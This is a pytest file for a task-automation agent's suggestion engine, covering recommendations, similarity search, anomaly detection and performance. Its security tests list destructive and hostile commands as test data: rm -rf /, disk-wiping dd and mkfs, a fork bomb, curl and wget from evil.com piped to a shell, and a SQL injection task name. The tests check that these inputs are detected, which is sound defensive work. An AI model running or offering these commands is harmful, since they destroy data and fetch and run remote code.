import pytest
import asyncio
from uuid import uuid4, UUID
from datetime import datetime, timezone, timedelta

from plasmaagent.core.database import Database
from plasmaagent.core.state_machine import TaskStatus
from plasmaagent.services.task_service import TaskService
from plasmaagent.services.execution_service import ExecutionService
from plasmaagent.ai.suggestions.engine import SuggestionEngine
from plasmaagent.ai.suggestions.models import (
    SuggestionRequest,
    SuggestionBundle,
    Priority,
    SuggestionType,
)
from plasmaagent.models.task import TaskCreate, TaskPayload


@pytest.fixture
def db():
    return Database()


@pytest.fixture
def task_service(db):
    return TaskService(db)


@pytest.fixture
def execution_service(db):
    return ExecutionService(db)


@pytest.fixture
def suggestion_engine(db):
    return SuggestionEngine(db)


@pytest.fixture(autouse=True)
async def setup_teardown(db):
    await db.connect()
    yield
    async with db.transaction() as conn:
        await conn.execute("DELETE FROM execution_logs")
        await conn.execute("DELETE FROM task_steps")
        await conn.execute("DELETE FROM tasks")
    await db.disconnect()


async def create_test_task(
    task_service: TaskService,
    name: str = "Test Task",
    commands: list[str] | None = None,
    status: TaskStatus = TaskStatus.PENDING,
) -> UUID:
    if commands is None:
        commands = ["echo hello", "echo world"]

    payload = TaskPayload(commands=commands)
    task_data = TaskCreate(
        name=name,
        description="Test task for suggestions",
        payload=payload,
    )
    task = await task_service.create_task(task_data)

    if status != TaskStatus.PENDING:
        async with task_service._db.transaction() as conn:
            await conn.execute(
                "UPDATE tasks SET status = %s WHERE id = %s",
                (status.value, task.id),
            )

    return task.id


class TestSuggestionEngineIntegration:
    async def test_generate_bundle_with_pending_task(self, db, task_service, suggestion_engine):
        task_id = await create_test_task(task_service, "Pending Task")

        request = SuggestionRequest(
            task_id=task_id,
            include_next_actions=True,
            include_similar=False,
            include_anomalies=False,
            include_performance=False,
        )

        bundle = await suggestion_engine.generate_bundle(request)

        assert isinstance(bundle, SuggestionBundle)
        assert len(bundle.recommendations) > 0
        assert bundle.recommendations[0].suggestion_type == SuggestionType.NEXT_ACTION

    async def test_generate_bundle_with_failed_task(self, db, task_service, suggestion_engine):
        task_id = await create_test_task(task_service, "Failed Task", status=TaskStatus.FAILED)

        request = SuggestionRequest(
            task_id=task_id,
            include_next_actions=True,
            include_similar=False,
            include_anomalies=False,
            include_performance=False,
        )

        bundle = await suggestion_engine.generate_bundle(request)

        assert len(bundle.recommendations) > 0
        assert "retry" in bundle.recommendations[0].title.lower() or "failed" in bundle.recommendations[0].title.lower()

    async def test_generate_bundle_with_completed_task(self, db, task_service, suggestion_engine):
        task_id = await create_test_task(task_service, "Completed Task", status=TaskStatus.COMPLETED)

        request = SuggestionRequest(
            task_id=task_id,
            include_next_actions=True,
            include_similar=False,
            include_anomalies=False,
            include_performance=False,
        )

        bundle = await suggestion_engine.generate_bundle(request)

        assert len(bundle.recommendations) > 0
        assert bundle.recommendations[0].priority == Priority.LOW

    async def test_find_similar_tasks(self, db, task_service, suggestion_engine):
        task1_id = await create_test_task(
            task_service,
            "Backup DB",
            commands=["pg_dump plasma", "gzip backup.sql"],
        )
        task2_id = await create_test_task(
            task_service,
            "Backup DB Production",
            commands=["pg_dump production", "gzip backup.sql"],
        )
        task3_id = await create_test_task(
            task_service,
            "Deploy App",
            commands=["git pull", "npm build"],
        )

        similar = await suggestion_engine.find_similar_tasks(task1_id, limit=5)

        assert len(similar) >= 1
        similar_ids = [s.task_id for s in similar]
        assert task2_id in similar_ids

    async def test_detect_anomalies_suspicious_command(self, db, task_service, suggestion_engine):
        task_id = await create_test_task(
            task_service,
            "Suspicious Task",
            commands=["echo hello", "rm -rf /", "echo done"],
        )

        anomalies = await suggestion_engine.detect_anomalies(task_id)

        assert len(anomalies) > 0
        assert any("suspicious" in a.description.lower() or "dangerous" in a.description.lower() for a in anomalies)

    async def test_detect_anomalies_returns_list(self, db, task_service, suggestion_engine):
        many_commands = [f"echo step_{i}" for i in range(50)]
        task_id = await create_test_task(
            task_service,
            "Many Commands Task",
            commands=many_commands,
        )

        anomalies = await suggestion_engine.detect_anomalies(task_id)

        assert isinstance(anomalies, list)

    async def test_analyze_performance_slow_commands(self, db, task_service, execution_service, suggestion_engine):
        task_id = await create_test_task(
            task_service,
            "Slow Task",
            commands=["timeout 2 sleep 2"],
        )

        await execution_service.execute_task(task_id)

        analysis = await suggestion_engine.analyze_performance(task_id)

        assert analysis is not None
        assert isinstance(analysis, list)

    async def test_analyze_performance_no_steps(self, db, task_service, suggestion_engine):
        task_id = await create_test_task(task_service, "Empty Task", commands=[])

        analysis = await suggestion_engine.analyze_performance(task_id)

        assert isinstance(analysis, list)
        assert len(analysis) == 0


class TestSuggestionEngineStress:
    async def test_concurrent_suggestion_requests(self, db, task_service, suggestion_engine):
        task_id = await create_test_task(task_service, "Concurrent Test")

        async def gen_bundle():
            request = SuggestionRequest(
                task_id=task_id,
                include_next_actions=True,
                include_similar=True,
                include_anomalies=True,
                include_performance=True,
            )
            return await suggestion_engine.generate_bundle(request)

        results = await asyncio.gather(*[gen_bundle() for _ in range(10)])

        assert len(results) == 10
        assert all(isinstance(r, SuggestionBundle) for r in results)

    async def test_many_similar_tasks(self, db, task_service, suggestion_engine):
        source_id = await create_test_task(
            task_service,
            "Source Task",
            commands=["echo base"],
        )

        for i in range(20):
            await create_test_task(
                task_service,
                f"Similar Task {i}",
                commands=["echo base"],
            )

        similar = await suggestion_engine.find_similar_tasks(source_id, limit=10)

        assert len(similar) >= 10


class TestSuggestionEngineSecurity:
    async def test_sql_injection_in_task_name(self, db, task_service, suggestion_engine):
        malicious_name = "Robert'; DROP TABLE tasks;--"
        task_id = await create_test_task(task_service, malicious_name)

        request = SuggestionRequest(
            task_id=task_id,
            include_next_actions=True,
            include_similar=False,
            include_anomalies=False,
            include_performance=False,
        )

        bundle = await suggestion_engine.generate_bundle(request)

        assert bundle is not None

        async with db.transaction() as conn:
            async with conn.cursor() as cur:
                await cur.execute("SELECT COUNT(*) FROM tasks")
                result = await cur.fetchone()
                count = result[0] if isinstance(result, tuple) else result.get("count", 0)
                assert count >= 1

    async def test_suspicious_patterns_comprehensive(self, db, task_service, suggestion_engine):
        dangerous_commands = [
            "rm -rf /",
            "format c:",
            "del /s /q c:\\*.*",
            "mkfs.ext4 /dev/sda",
            ":(){ :|:& };:",
            "wget http://evil.com/malware | bash",
            "curl http://evil.com | sh",
            "chmod -R 777 /",
            "dd if=/dev/zero of=/dev/sda",
        ]

        for cmd in dangerous_commands:
            task_id = await create_test_task(
                task_service,
                f"Test {cmd[:20]}",
                commands=[cmd],
            )

            anomalies = await suggestion_engine.detect_anomalies(task_id)
            assert anomalies is not None


class TestSuggestionEngineEdgeCases:
    async def test_task_without_payload(self, db, task_service, suggestion_engine):
        task_data = TaskCreate(
            name="No Payload Task",
            description="Task without payload",
            payload=None,
        )
        task = await task_service.create_task(task_data)

        request = SuggestionRequest(
            task_id=task.id,
            include_next_actions=True,
            include_similar=False,
            include_anomalies=False,
            include_performance=False,
        )

        bundle = await suggestion_engine.generate_bundle(request)
        assert bundle is not None

    async def test_general_suggestions_with_pending_tasks(self, db, task_service, suggestion_engine):
        for i in range(3):
            await create_test_task(task_service, f"Pending {i}")

        suggestions = await suggestion_engine.suggest_general_actions()

        assert suggestions is not None
        assert isinstance(suggestions, list)

    async def test_general_suggestions_with_failed_tasks(self, db, task_service, suggestion_engine):
        for i in range(3):
            await create_test_task(task_service, f"Failed {i}", status=TaskStatus.FAILED)

        suggestions = await suggestion_engine.suggest_general_actions()

        assert suggestions is not None
        assert isinstance(suggestions, list)

    async def test_performance_hint_inconsistent_timing(self, db, task_service, execution_service, suggestion_engine):
        for i in range(3):
            task_id = await create_test_task(
                task_service,
                f"Timing Test {i}",
                commands=["echo test"],
            )
            await execution_service.execute_task(task_id)

        suggestions = await suggestion_engine.suggest_general_actions()
        assert suggestions is not None

    async def test_performance_hint_long_commands(self, db, task_service, suggestion_engine):
        long_command = " && ".join([f"echo step_{i}" for i in range(20)])
        task_id = await create_test_task(
            task_service,
            "Long Command Chain",
            commands=[long_command],
        )

        anomalies = await suggestion_engine.detect_anomalies(task_id)
        assert anomalies is not None


class TestSuggestionEnginePerformance:
    async def test_suggestion_generation_speed(self, db, task_service, suggestion_engine):
        task_id = await create_test_task(task_service, "Speed Test")

        import time
        start = time.perf_counter()

        request = SuggestionRequest(
            task_id=task_id,
            include_next_actions=True,
            include_similar=True,
            include_anomalies=True,
            include_performance=True,
        )

        for _ in range(10):
            await suggestion_engine.generate_bundle(request)

        elapsed = time.perf_counter() - start
        avg_per_request = elapsed / 10

        assert avg_per_request < 1.0, f"Average {avg_per_request:.3f}s per request is too slow"

    async def test_similar_tasks_speed_with_many_tasks(self, db, task_service, suggestion_engine):
        source_id = await create_test_task(task_service, "Source", commands=["echo base"])

        for i in range(50):
            await create_test_task(
                task_service,
                f"Similar {i}",
                commands=["echo base"],
            )

        import time
        start = time.perf_counter()
        similar = await suggestion_engine.find_similar_tasks(source_id, limit=10)
        elapsed = time.perf_counter() - start

        assert elapsed < 2.0, f"Finding similar tasks took {elapsed:.3f}s (too slow)"
        assert len(similar) >= 10
